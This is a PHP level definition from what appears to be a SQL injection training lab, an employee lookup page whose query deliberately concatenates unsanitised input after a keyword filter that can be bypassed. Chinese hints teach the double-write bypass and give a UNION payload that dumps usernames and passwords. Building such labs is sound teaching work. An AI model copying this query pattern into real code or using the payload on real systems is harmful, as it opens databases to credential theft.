<?php
// Less-25 通讯录查询
if (!defined('SQLI_MALL')) { die('forbidden'); }
return [
  'title' => '通讯录查询',
  'desc'  => '按员工编号查询工号与姓名。',
  'method' => 'GET',
  'form' => ['method' => 'GET', 'fields' => array (
  'id' => '员工编号',
), 'submit' => '查 询'],
  'difficulty' => 3,
  'task' => 'or / and 被过滤，想办法让过滤后剩下的字符恰好拼出关键词',
  'hints' => array (
  0 => '系统把 or 和 and（不分大小写）直接删除。删除一次之后，剩下的字符会不会又拼出关键词？',
  1 => '双写绕过：oorr → or、aandnd → and；information_schema 要写 infoorrmation_schema。',
  2 => '示例：?id=-1\' union select 1,group_concat(username,0x3a,passwoorrd),3 from oa_employee--+ 若需 and 用 aandnd',
),
  'run' => function ($app) {
    if (!isset($_GET['id'])) return $app->info('请输入员工编号。');
    $id = $_GET['id'];
    $id = preg_replace('/or/i', '', $id);
    $id = preg_replace('/AND/i', '', $id);
    $sql = "SELECT id, emp_no, name FROM oa_employee WHERE id='{$id}' LIMIT 0,1";
    $res = $app->q($sql);
    $row = $app->fetch($res);
    if ($row) {
    return $app->card(['工号' => $row['emp_no'], '姓名' => $row['name']]);
    }
    return $app->note($app->error());
  },
];
